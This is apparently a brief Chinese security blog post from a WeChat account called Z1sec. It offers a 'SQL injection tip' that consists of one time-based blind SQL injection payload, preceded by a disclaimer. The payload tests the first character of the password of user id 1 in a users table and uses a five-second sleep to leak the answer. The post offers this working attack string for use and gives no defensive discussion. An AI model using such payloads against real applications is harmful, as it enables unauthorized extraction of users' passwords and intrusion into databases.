> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg3NzU1NzIyMg==&mid=2247485077&idx=2&sn=4f9796950c81096290b7320d7e14b027

#  Sqli Tips：一条很好的sql注入探测语句  
z1  Z1sec   2025-06-19 03:44  
  
   
  
> **免责声明：**  
由于传播、利用本公众号Z1sec所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
   
  
Payload：  
  
   
  

```
IF (SUBSTRING ((SELECT pwd FROM users WHERE id = 1) ,1,1) = 'a', SLEEP (5) ,0)
```

  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/bnXduaibt5TE6xIGPOTtwtI3KMY7G6jKPm4jLpbFYPnkhCUkFXNTZf8xAXzYo0HKzicMY4agIPpicrhHFxicN81twg/640?wx_fmt=png&from=appmsg "")  
  
  
  
